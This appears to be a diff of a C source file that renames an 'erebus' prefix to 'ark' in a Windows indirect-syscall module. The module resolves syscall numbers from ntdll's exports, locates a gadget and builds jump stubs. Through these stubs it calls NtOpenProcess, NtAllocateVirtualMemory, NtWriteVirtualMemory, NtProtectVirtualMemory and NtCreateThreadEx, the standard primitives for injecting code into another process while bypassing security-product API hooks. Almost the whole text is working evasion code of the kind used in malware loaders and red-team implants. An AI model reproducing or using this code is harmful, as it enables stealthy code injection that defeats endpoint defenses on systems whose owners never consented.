@@ -4,20 +4,20 @@
 #include <stdint.h>
 #include <string.h>
 
-#include "erebus/syscall.h"
+#include "ark/syscall.h"
 
-#define EREBUS_MAX_SYSCALLS 8
+#define ARK_MAX_SYSCALLS 8
 
-typedef struct erebus_syscall_entry {
+typedef struct ark_syscall_entry {
     DWORD  ssn;
     PVOID  stub;
     char   name[48];
-} erebus_syscall_entry;
+} ark_syscall_entry;
 
-static erebus_syscall_entry g_syscalls[EREBUS_MAX_SYSCALLS];
+static ark_syscall_entry g_syscalls[ARK_MAX_SYSCALLS];
 static int g_syscall_count = 0;
 
-static PVOID erebus_get_ntdll(void) {
+static PVOID ark_get_ntdll(void) {
 #ifdef _WIN64
     PPEB peb = (PPEB)__readgsqword(0x60);
 #else
@@ -33,7 +33,7 @@ static PVOID erebus_get_ntdll(void) {
     return NULL;
 }
 
-static DWORD erebus_resolve_ssn_name(PVOID ntdll, const char *target) {
+static DWORD ark_resolve_ssn_name(PVOID ntdll, const char *target) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
     PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ntdll +
@@ -60,7 +60,7 @@ static DWORD erebus_resolve_ssn_name(PVOID ntdll, const char *target) {
     return 0xFFFFFFFF;
 }
 
-static PVOID erebus_find_gadget(PVOID ntdll) {
+static PVOID ark_find_gadget(PVOID ntdll) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
     DWORD size = nt->OptionalHeader.SizeOfImage;
@@ -74,18 +74,18 @@ static PVOID erebus_find_gadget(PVOID ntdll) {
 
 #ifdef _WIN64
 #pragma pack(push, 1)
-typedef struct erebus_jmp_gadget {
+typedef struct ark_jmp_gadget {
     BYTE mov_r10_rcx[3];
     BYTE mov_eax[1];
     DWORD ssn;
     BYTE jmp[6];
     UINT64 gadget;
-} erebus_jmp_gadget;
+} ark_jmp_gadget;
 #pragma pack(pop)
 
-static PVOID erebus_build_stub(DWORD ssn, PVOID gadget) {
-    erebus_jmp_gadget *s = (erebus_jmp_gadget *)VirtualAlloc(
-        NULL, sizeof(erebus_jmp_gadget), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+static PVOID ark_build_stub(DWORD ssn, PVOID gadget) {
+    ark_jmp_gadget *s = (ark_jmp_gadget *)VirtualAlloc(
+        NULL, sizeof(ark_jmp_gadget), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!s) return NULL;
     s->mov_r10_rcx[0] = 0x4C; s->mov_r10_rcx[1] = 0x8B; s->mov_r10_rcx[2] = 0xD1;
     s->mov_eax[0] = 0xB8;
@@ -99,71 +99,71 @@ static PVOID erebus_build_stub(DWORD ssn, PVOID gadget) {
 }
 #endif
 
-static int erebus_register(const char *name, PVOID ntdll, PVOID gadget) {
-    if (g_syscall_count >= EREBUS_MAX_SYSCALLS) return 0;
-    DWORD ssn = erebus_resolve_ssn_name(ntdll, name);
+static int ark_register(const char *name, PVOID ntdll, PVOID gadget) {
+    if (g_syscall_count >= ARK_MAX_SYSCALLS) return 0;
+    DWORD ssn = ark_resolve_ssn_name(ntdll, name);
     if (ssn == 0xFFFFFFFF) return 0;
 #ifdef _WIN64
-    PVOID stub = erebus_build_stub(ssn, gadget);
+    PVOID stub = ark_build_stub(ssn, gadget);
     if (!stub) return 0;
 #else
     PVOID stub = NULL;
 #endif
-    erebus_syscall_entry *e = &g_syscalls[g_syscall_count++];
+    ark_syscall_entry *e = &g_syscalls[g_syscall_count++];
     e->ssn = ssn;
     e->stub = stub;
     strncpy(e->name, name, sizeof(e->name) - 1);
     return 1;
 }
 
-static erebus_syscall_entry *erebus_lookup(const char *name) {
+static ark_syscall_entry *ark_lookup(const char *name) {
     for (int i = 0; i < g_syscall_count; i++)
         if (strcmp(g_syscalls[i].name, name) == 0) return &g_syscalls[i];
     return NULL;
 }
 
-int erebus_syscall_init(void) {
-    PVOID ntdll = erebus_get_ntdll();
-    PVOID gadget = ntdll ? erebus_find_gadget(ntdll) : NULL;
+int ark_syscall_init(void) {
+    PVOID ntdll = ark_get_ntdll();
+    PVOID gadget = ntdll ? ark_find_gadget(ntdll) : NULL;
     if (!ntdll || !gadget) return 0;
-    erebus_register("NtAllocateVirtualMemory", ntdll, gadget);
-    erebus_register("NtWriteVirtualMemory", ntdll, gadget);
-    erebus_register("NtProtectVirtualMemory", ntdll, gadget);
-    erebus_register("NtCreateThreadEx", ntdll, gadget);
-    erebus_register("NtOpenProcess", ntdll, gadget);
+    ark_register("NtAllocateVirtualMemory", ntdll, gadget);
+    ark_register("NtWriteVirtualMemory", ntdll, gadget);
+    ark_register("NtProtectVirtualMemory", ntdll, gadget);
+    ark_register("NtCreateThreadEx", ntdll, gadget);
+    ark_register("NtOpenProcess", ntdll, gadget);
     return g_syscall_count > 0;
 }
 
 #ifdef _WIN64
-typedef NTSTATUS (NTAPI *erebus_stub_fn)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);
+typedef NTSTATUS (NTAPI *ark_stub_fn)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);
 
-#define EREBUS_INVOKE(name, ...) do { \
-    erebus_syscall_entry *_e = erebus_lookup(name); \
+#define ARK_INVOKE(name, ...) do { \
+    ark_syscall_entry *_e = ark_lookup(name); \
     if (!_e || !_e->stub) return (NTSTATUS)0xC0000001L; \
-    return ((erebus_stub_fn)_e->stub)(__VA_ARGS__); \
+    return ((ark_stub_fn)_e->stub)(__VA_ARGS__); \
 } while (0)
 #else
-#define EREBUS_INVOKE(name, ...) return (NTSTATUS)0xC0000001L
+#define ARK_INVOKE(name, ...) return (NTSTATUS)0xC0000001L
 #endif
 
-NTSTATUS erebus_NtAllocateVirtualMemory(HANDLE h, PVOID *base, ULONG_PTR z, PSIZE_T sz, ULONG type, ULONG prot) {
-    EREBUS_INVOKE("NtAllocateVirtualMemory", h, base, (PVOID)z, sz, (PVOID)(ULONG_PTR)type, (PVOID)(ULONG_PTR)prot, NULL, NULL, NULL, NULL, NULL);
+NTSTATUS ark_NtAllocateVirtualMemory(HANDLE h, PVOID *base, ULONG_PTR z, PSIZE_T sz, ULONG type, ULONG prot) {
+    ARK_INVOKE("NtAllocateVirtualMemory", h, base, (PVOID)z, sz, (PVOID)(ULONG_PTR)type, (PVOID)(ULONG_PTR)prot, NULL, NULL, NULL, NULL, NULL);
 }
 
-NTSTATUS erebus_NtWriteVirtualMemory(HANDLE h, PVOID base, PVOID buf, SIZE_T n, PSIZE_T written) {
-    EREBUS_INVOKE("NtWriteVirtualMemory", h, base, buf, (PVOID)n, written, NULL, NULL, NULL, NULL, NULL, NULL);
+NTSTATUS ark_NtWriteVirtualMemory(HANDLE h, PVOID base, PVOID buf, SIZE_T n, PSIZE_T written) {
+    ARK_INVOKE("NtWriteVirtualMemory", h, base, buf, (PVOID)n, written, NULL, NULL, NULL, NULL, NULL, NULL);
 }
 
-NTSTATUS erebus_NtProtectVirtualMemory(HANDLE h, PVOID *base, PSIZE_T sz, ULONG prot, PULONG old) {
-    EREBUS_INVOKE("NtProtectVirtualMemory", h, base, sz, (PVOID)(ULONG_PTR)prot, old, NULL, NULL, NULL, NULL, NULL, NULL);
+NTSTATUS ark_NtProtectVirtualMemory(HANDLE h, PVOID *base, PSIZE_T sz, ULONG prot, PULONG old) {
+    ARK_INVOKE("NtProtectVirtualMemory", h, base, sz, (PVOID)(ULONG_PTR)prot, old, NULL, NULL, NULL, NULL, NULL, NULL);
 }
 
-NTSTATUS erebus_NtCreateThreadEx(PHANDLE th, ACCESS_MASK acc, PVOID oa, HANDLE proc, PVOID start, PVOID arg,
+NTSTATUS ark_NtCreateThreadEx(PHANDLE th, ACCESS_MASK acc, PVOID oa, HANDLE proc, PVOID start, PVOID arg,
     ULONG flags, SIZE_T zb, SIZE_T ss, SIZE_T mss, PVOID al) {
-    EREBUS_INVOKE("NtCreateThreadEx", th, (PVOID)(ULONG_PTR)acc, oa, proc, start, arg,
+    ARK_INVOKE("NtCreateThreadEx", th, (PVOID)(ULONG_PTR)acc, oa, proc, start, arg,
         (PVOID)(ULONG_PTR)flags, (PVOID)zb, (PVOID)ss, (PVOID)mss, al);
 }
 
-NTSTATUS erebus_NtOpenProcess(PHANDLE h, ACCESS_MASK acc, PVOID oa, PVOID cid) {
-    EREBUS_INVOKE("NtOpenProcess", h, (PVOID)(ULONG_PTR)acc, oa, cid, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+NTSTATUS ark_NtOpenProcess(PHANDLE h, ACCESS_MASK acc, PVOID oa, PVOID cid) {
+    ARK_INVOKE("NtOpenProcess", h, (PVOID)(ULONG_PTR)acc, oa, cid, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 }
